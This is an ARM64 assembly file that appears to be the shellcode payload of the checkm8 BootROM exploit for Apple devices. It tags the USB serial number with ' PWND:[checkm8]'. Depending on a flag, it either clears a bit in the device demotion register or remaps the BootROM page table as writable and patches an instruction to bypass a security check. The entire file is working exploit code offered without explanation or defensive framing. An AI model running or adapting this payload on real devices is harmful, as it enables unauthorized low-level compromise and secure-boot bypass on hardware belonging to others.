.text

.pool
.set gUSBSerialNumber,             0x180087958
.set gUSBSRNMStringDescriptor,     0x1800807DA
.set gUSBDescriptors,              0x1800877E0
.set usb_create_string_descriptor, 0x10000E354

.set demote_flag,                  0x4142434445464748
.set gDemotionRegister,            0x2102BC000

.set VROM_PAGE_TABLE_ADDR,         0x1800C8400
.set PATCH_ADDR,                   0x10000812C // 0x10000812C: CBNZ X8, loc_100008144(C80000B5) -> MOV x0, #0x0(000080D2)
.set INSN_MOV_X0_0,                0xd2800000

.global _main
_main:
  //mov   x19, #0                      // HACK: do not free this usb request
  stp   x29, x30, [sp, #-0x10]!
  mov   x29, sp

  //ldr   x0, =gUSBDescriptors
  //ldp   x0, x1, [x0]
  //adr   x2, USB_DESCRIPTOR
  //ldp   x3, x4, [x2]
  //ldp   x3, x4, [x2, #0x10]

  ldr   x0, =gUSBSerialNumber
_find_zero_loop:
  add   x0, x0, #1
  ldrb  w1, [x0]
  cbnz  w1, _find_zero_loop

  adr   x1, PWND_STRING
  ldp   x2, x3, [x1]
  stp   x2, x3, [x0]

  ldr   x0, =gUSBSerialNumber
  ldr   x1, =usb_create_string_descriptor
  blr   x1

  ldr   x1, =gUSBSRNMStringDescriptor
  strb  w0, [x1]

  ldr   x0, =demote_flag
  cmp   x0, #1
  bne   _eclipsa

_demotion:
  ldr   x1, =gDemotionRegister
  ldr   w0, [x1]
  tst   w0, #1
  beq   _end
  ldr   w0, [x1]
  and   w0, w0, #0xfffffffe
  str   w0, [x1]
  b     _end

_eclipsa:
  msr   daifset, #0x3
  isb
  ldr   x0, =VROM_PAGE_TABLE_ADDR
  ldr   x10, [x0]
  orr   x10, x10, #0x60000000000000
  and   x10, x10, #0xffffffffffffff7f
  str   x10, [x0]
  dsb   sy
  tlbi  alle3
  dsb   sy
  isb

  ldr   w9, =INSN_MOV_X0_0
  ldr   x19, =PATCH_ADDR
  str   w9, [x19]

  and   x10, x10, #0xff9fffffffffffff
  orr   x10, x10, #0x80
  str   x10, [x0]
  dsb   sy
  tlbi  alle3
  dsb   sy
  isb

  msr   daifclr, #0x3
  isb

_end:
  sys  #0, c7, c5, #0
  dsb  sy
  isb

  ldp  x29, x30, [sp], #0x10
  ret

//USB_DESCRIPTOR:
//.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0

PWND_STRING:
.asciz " PWND:[checkm8]"
